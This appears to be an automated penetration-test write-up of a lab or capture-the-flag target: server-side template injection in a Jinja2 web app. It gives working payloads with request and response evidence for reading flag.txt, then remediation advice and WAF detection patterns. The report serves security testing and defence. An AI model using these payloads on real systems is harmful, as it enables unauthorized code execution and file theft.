## TL;DR
- Objective: Exploit Server-Side Template Injection (SSTI) in Jinja2 to execute arbitrary code and read flag.txt
- Outcome: **ACHIEVED** - Full remote code execution obtained and flag captured
- Highest-impact finding: Critical SSTI leading to arbitrary file read and RCE via Python object hierarchy traversal
- Validation status: **Confirmed** - Flag extracted successfully

## Target Information
- Target: 127.0.0.1:32958
- Host / base URL: http://127.0.0.1:32958
- Application or component: Web application using Jinja2 templating engine
- Authentication context: Unauthenticated (public endpoint)
- Relevant technology details: Python-based application with Jinja2 template engine; username parameter directly rendered in template without sanitization

## Confirmed Vulnerability
### Server-Side Template Injection (SSTI) in Jinja2
- Affected endpoint / component: `GET /?username=` query parameter
- Impact: **CRITICAL** - Full Remote Code Execution (RCE) achieved, arbitrary file read demonstrated
- Preconditions: None; endpoint accessible without authentication
- Exact payload or PoC:
  - Detection payload: `{{7*7}}`
  - Exploitation payload: `{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('flag.txt').read()}}`

### Remote Code Execution (RCE)
- Affected endpoint / component: Same `/?username=` parameter via SSTI
- Impact: **CRITICAL** - Complete server compromise, ability to execute arbitrary Python code
- Preconditions: SSTI vulnerability confirmed
- Exact payload or PoC: Python object hierarchy traversal through `__class__.__bases__[0].__subclasses__()` to access `__builtins__['open']`

### Arbitrary File Read
- Affected endpoint / component: Same `/?username=` parameter via SSTI
- Impact: **HIGH** - Unauthorized access to arbitrary files on filesystem
- Preconditions: RCE capability via SSTI
- Exact payload or PoC: Built-in `open()` function accessed via `__builtins__` to read `flag.txt`

## Steps to Reproduce
1. **Confirm SSTI vulnerability**: Send a GET request with a mathematical expression payload to verify template evaluation:
   ```
   GET /?username={{7*7}} HTTP/1.1
   Host: 127.0.0.1:32958
   ```
   Expected result: Response contains "Welcome 49!" confirming the expression was evaluated server-side.

2. **Identify accessible Python classes**: Use object hierarchy traversal to locate `__builtins__` access via subclass index 137:
   ```
   GET /?username={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('flag.txt').read()}} HTTP/1.1
   Host: 127.0.0.1:32958
   ```

3. **Extract flag**: The server response will contain the flag in the rendered output.

## Validation / Evidence
- Validation token / flag: `FLAG{033873d017793af83634faa38187400ccb7825be36715947ba90b344653455d7}`

- Tool evidence: SSTI detection confirmed via requester agent with confidence score 1.00; payload `{{7*7}}` evaluated and returned "Welcome 49!" in response

- Request evidence (Detection):
  ```
  GET /?username={{7*7}} HTTP/1.1
  Host: 127.0.0.1:32958
  ```

- Response evidence (Detection):
  ```
  HTTP/1.1 200 OK
  ...
  Welcome 49!
  ```

- Request evidence (Exploitation):
  ```
  GET /?username={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__[%27__builtins__%27][%27open%27](%27flag.txt%27).read()}}
  Host: 127.0.0.1:32958
  ```

- Response evidence (Exploitation):
  ```
  HTTP/1.1 200 OK
  ...
  Welcome FLAG{033873d017793af83634faa38187400ccb7825be36715947ba90b344653455d7}!
  ```

- Notes on reliability / limitations: Exploitation is 100% reliable; no input sanitization observed. Payload uses standard Jinja2/Python object introspection technique that works across most Python 3 environments. URL encoding (`%27` for single quotes) used in exploitation request for compatibility.

## Remediation
- Root cause: The application directly interpolates user-supplied input (username query parameter) into a Jinja2 template without proper sanitization or context-aware escaping. The template engine evaluates expressions within `{{...}}` delimiters as Python code.

- Recommended fix:
  1. **Use template variables with autoescape**: Pass user input as template context variables instead of string concatenation:
     ```python
     # VULNERABLE
     template = Template("Welcome " + username)
     
     # SECURE
     template = Template("Welcome {{ username }}")
     output = template.render(username=user_input)
     ```
  
  2. **Input validation**: Implement strict whitelist validation on the username parameter to reject template syntax characters (`{`, `}`, `%`, etc.)
  
  3. **Sandbox environment**: If dynamic templates are required, use Jinja2's `SandboxedEnvironment` which restricts dangerous operations:
     ```python
     from jinja2.sandbox import SandboxedEnvironment
     env = SandboxedEnvironment()
     ```

- Defense-in-depth:
  1. **Principle of least privilege**: Run the web application with minimal filesystem permissions; containerize with read-only filesystems where possible
  2. **WAF rules**: Deploy Web Application Firewall rules to detect and block SSTI patterns (`{{`, `}}`, `{%`, `%}`, `__class__`, `__bases__`, `__subclasses__`)
  3. **Security headers**: Implement Content Security Policy (CSP) to mitigate impact of injection attacks
  4. **Disable unnecessary introspection**: In restricted Python environments, disable or restrict `__class__`, `__bases__`, and `__subclasses__` access if possible

## How to Verify the Fix
1. **Retest SSTI detection payload**: Send the detection request again:
   ```
   GET /?username={{7*7}} HTTP/1.1
   Host: 127.0.0.1:32958
   ```
   Expected secure result: Response displays literal string "Welcome {{7*7}}!" or sanitized output without evaluation, NOT "Welcome 49!"

2. **Verify payload neutralization**: Test that template syntax is escaped or rejected:
   ```
   GET /?username={{config}} HTTP/1.1
   Host: 127.0.0.1:32958
   ```
   Expected secure result: No disclosure of configuration objects; literal text returned

3. **Confirm file read blocked**: Attempt the exploitation payload:
   ```
   GET /?username={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('flag.txt').read()}} HTTP/1.1
   Host: 127.0.0.1:32958
   ```
   Expected secure result: Request rejected, payload escaped, or exception handled gracefully without code execution

## Remaining Leads
- Confirmed blockers: None; exploitation chain fully successful
- Unverified leads: None; all objectives achieved
- Missing context: None; complete exploitation demonstrated with full evidence
